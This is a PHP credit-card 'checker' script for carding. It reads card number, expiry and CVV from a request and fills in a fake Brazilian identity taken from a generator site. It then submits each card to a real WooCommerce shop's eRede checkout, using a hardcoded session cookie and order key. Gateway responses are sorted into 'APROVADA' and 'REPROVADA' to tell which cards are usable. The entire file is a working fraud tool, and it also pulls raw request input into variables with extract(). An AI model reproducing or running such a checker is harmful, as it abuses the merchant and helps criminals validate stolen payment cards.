<?php
error_reporting(0);
set_time_limit(0);

DeletarCookies();
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function deletarCookies() {
    if (file_exists("cookie.txt")) {
        unlink("cookie.txt");
    }
}
function multiexplode ($delimiters,$string){
    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return  $launch;}

function getStr2($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = $_GET['lista'];
$lista = str_replace(" ", "", $lista);
$separadores = array(",","|",":","'"," ","~","Â»");
$explode = multiexplode($separadores,$lista);
$cc = $explode[0];
$mes = $explode[1];
$ano = $explode[2];
$cvv = $explode[3];


$number1 = substr($cc,0,4);
$number2 = substr($cc,4,4);
$number3 = substr($cc,8,4);
$number4 = substr($cc,12,4);

/*if($ano == 2019){  //QUANDO O ANO DO GATE NÃƒO TIVER 20, USE ESSA FUNÃ‡ÃƒO '.$ano1.'
$ano1 = "19";
}else if($ano == 2020){
$ano1 = "20";
}else if($ano == 2021){
$ano1 = "21";
}else if($ano == 2022){
$ano1 = "22";
}else if($ano == 2023){
$ano1 = "23";
}else if($ano == 2024){
$ano1 = "24";
}else if($ano == 2025){
$ano1 = "25";
}else if($ano == 2026){
$ano1 = "26";
}else if($ano == 2027){
$ano1 = "27";
}else if($ano == 2028){
$ano1 = "28";
}else if($ano == 2029){
$ano1 = "29";
}else if($ano == 2030){
$ano1 = "30";
}else if($ano == 2031){
$ano1 = "31";
}else{
    '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> Validade Invalida</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}*/

/*if($cc[0]==4){ //QUANDO VOCÃŠ NÃƒO QUISER QUE TESTE UMA TAL GERADA NO GATE
'<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}else if($cc[0]==5){
    '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}else if($cc[0]==3){
    '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}else if($cc[0]==2){
    '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}else if($cc[0]==1){
     '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}*/

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

//=========================================//4 DEVS PHP//=========================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.4devs.com.br/ferramentas_online.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'acao=gerar_pessoa&sexo=I&pontuacao=S&idade=0&cep_estado=&txt_qtde=1&cep_cidade=');
$dados = curl_exec($ch);

$dados1 = json_decode($dados, true);

$name = $dados1["nome"];
$cpf = $dados1["cpf"];
$cep = $dados1["cep"];
$endereco = $dados1["endereco"];
$celular = $dados1["celular"];
$email = mt_rand();

//=========================================//PEGAR AS REQUEST DO TOKEN DO SITE//=========================================//

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://memariaemilia.com.br/finalizar-compra/pagamento-pedido/10468/?pay_for_order=true&key=wc_order_cPDWlKFRXc8TC');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; moto e5 plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'Content-Type: application/x-www-form-urlencoded',
'Host: memariaemilia.com.br',
'origin: https://memariaemilia.com.br',
'referer: https://memariaemilia.com.br/finalizar-compra/pagamento-pedido/10468/?pay_for_order=true&key=wc_order_cPDWlKFRXc8TC',
'Cookie:  __cfduid=df0eeafa632306a4b805854988a88e1af1591840034;_ga=GA1.3.715473342.1591840043;_gid=GA1.3.443934081.1591840043;_fbp=fb.2.1591840044309.1697944044;wordpress_logged_in_8554327b260dca8717e21dd61047c1c2=Rafael091%7C1593050558%7C4Z5uiALhYNKBzLcZ0uzYFfPkHsoaFX5sqDxf1PiOTRZ%7C9e6355ca711ee5d3d6ba8b147516dae53c119f41e3358e17152447a8bd38336b;wp_woocommerce_session_8554327b260dca8717e21dd61047c1c2=2435%7C%7C1592013480%7C%7C1592009880%7C%7Cc5847e331eaf14680c4e8f6db84bf34f',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Linux; Android 8.0.0; moto e5 plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36',
//'X-Requested-With: XMLHttpRequest',
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=loja5_woo_novo_erede&erede_api%5Bbandeira%5D=visa&erede_api%5Btitular%5D='.$name.'&erede_api%5Bfiscal%5D=51655552830&erede_api%5Bnumero%5D='.$cc.'&erede_api%5Bvalidade%5D='.$mes.'%2F'.$ano.'&erede_api%5Bcvv%5D='.$cvv.'&erede_api%5Bparcela%5D=MXwxfDI1MS43NHxkbWx6WVE9PXxNalV4TGpjMHxjZjlmYjg0MDZiY2M1OWE1MDE1ODg2NmZiNmY0ODU2OA%3D%3D&woocommerce_pay=1&woocommerce-pay-nonce=95d9a122d2&_wp_http_referer=%2Ffinalizar-compra%2Fpagamento-pedido%2F10468%2F%3Fpay_for_order%3Dtrue%26key%3Dwc_order_cPDWlKFRXc8TC');
$retorn = curl_exec($ch);

include("bin.php");

$bin = ''.$banco.' ('.$pais.') '.$nivel.' - '.$tipo.'';

if (strpos($retorn, 'Unauthorized. Restricted card.') !== false) {
echo
"<span class='label label-danger'> #REPROVADA </span><strong> ".$lista." </strong> -
 <span class='label label-default'> $bin </span> -
<span class='label label-danger'>Retorno: Restricted card.</span> - 
<span class='label label-default'> $proxy </span> -
<div class='label label-default'>#fredo.app</div>";

}elseif (strpos($retorn, 'Unauthorized. Nonexistent card.') !== false) {
echo
"<span class='label label-danger'> #REPROVADA </span><strong> ".$lista." </strong> -
 <span class='label label-default'> $bin </span> -
<span class='label label-danger'>Retorno: Nonexistent card.</span> - 
<span class='label label-default'> $proxy </span> -
<div class='label label-default'>#fredo.app</div>";


}elseif (strpos($retorn, 'Unauthorized. Transaction type not allowed for this card.') !== false) {
echo
"<span class='label label-danger'> #REPROVADA </span><strong> ".$lista." </strong> -
 <span class='label label-default'> $bin </span> -
<span class='label label-warning'>Retorno: Unauthorized. Transaction type not allowed for this card.</span> - 
<span class='label label-default'> $proxy </span> -
<div class='label label-default'>#fredo.app</div>";

}elseif (strpos($retorn, 'Product or service disabled for this merchant. Contact Rede.') !== false) {
echo
"<span class='label label-danger'> #REPROVADA </span><strong> ".$lista." </strong> -
 <span class='label label-default'> $bin </span> -
<span class='label label-danger'>Retorno: Product or service disabled for this merchant. Contact Rede.</span> - 
<span class='label label-default'> $proxy </span> -
<div class='label label-default'>#fredo.app</div>";

}elseif (strpos($retorn, 'Unauthorized. Invalid security code.') !== false) {
echo
"<span class='label label-success'> #APROVADA </span><strong> ".$lista." </strong> -
 <span class='label label-default'> $bin </span> -
<span class='label label-success'> Retorno: Invalid security code.</span> - 
<span class='label label-default'> $proxy </span> -
<div class='label label-default'>#fredo.app</div>";

}elseif (strpos($retorn, 'Error in issuer processing. Please try again.') !== false) {
echo
"<span class='label label-danger'> #REPROVADA </span><strong> ".$lista." </strong> -
 <span class='label label-default'> $bin </span> -
<span class='label label-warning'>reprovada</span> - 
<span class='label label-default'> $proxy </span> -
<div class='label label-default'>#fredo.app</div>";

}elseif (strpos($retorn, 'Unauthorized. Expiry date expired.') !== false) {
echo
"<span class='label label-danger'> #REPROVADA </span><strong> ".$lista." </strong> -
 <span class='label label-default'> $bin </span> -
<span class='label label-warning'>Retorno: Data errada da gerada</span> - 
<span class='label label-default'> $proxy </span> -
<div class='label label-default'>#fredo.app</div>";

 }else {
echo
"<span class='label label-danger'> #REPROVADA </span><strong> ".$lista." </strong> -
 <span class='label label-default'> $bin </span> -
<span class='label label-warning'></span> - 
<span class='label label-default'> $proxy </span> -
<div class='label label-default'>#fredo.app</div>";

}



?>